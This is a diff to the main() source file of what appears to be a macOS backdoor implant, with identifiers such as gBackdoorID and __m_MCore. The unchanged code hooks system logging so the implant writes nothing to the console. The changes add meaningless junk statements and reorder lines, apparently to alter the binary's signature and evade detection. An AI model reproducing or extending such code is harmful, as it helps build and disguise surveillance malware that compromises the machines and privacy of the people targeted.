@@ -22,6 +22,7 @@ extern void lionSendEventToPid(pid_t pid);
 
 #ifndef ENABLE_LOGGING
 #include <asl.h>
+
 // Do not log anything in the console
 static int _hook_asl_send(aslclient client, aslmsg msg)
 {
@@ -43,8 +44,8 @@ int main (int argc, const char *argv[])
 #endif
   
   // FIXED- fixing string binary patched
-  gMode[5] = 0;
   gBackdoorID[14] = gBackdoorID[15] = 0;
+  gMode[5] = 0;
   
   // Fix for lion: AppleEvents only from unhidden proc
   if (argc > 1) 
@@ -52,19 +53,31 @@ int main (int argc, const char *argv[])
       if (argv[1] &&
           (strncmp(argv[1], "-p", strlen("-p")) == 0)) 
         {
+          NSAutoreleasePool *innerpool = [[NSAutoreleasePool alloc] init];
+          
+          int a=0;
+          
+          a++;
+          
           pid_t pid = atoi(argv[2]);
 
           lionSendEventToPid(pid);
 
+          [innerpool release];
+          
           [pool release];
+          
+          a--;
+          
           exit(0);
         }
     }
   
+  gUtil = [__m_MUtils sharedInstance];
+  
   NSString *offlineFlagPath = [[NSString alloc] initWithFormat: @"%@/off.flg",
                                [[NSBundle mainBundle] bundlePath]];
   
-  gUtil = [__m_MUtils sharedInstance];
   __m_MCore *core = [[__m_MCore alloc] init];
   
   //
@@ -122,6 +135,7 @@ int main (int argc, const char *argv[])
 #endif
   
   [core runMeh];
+  
   [pool drain];
   
   return 0;
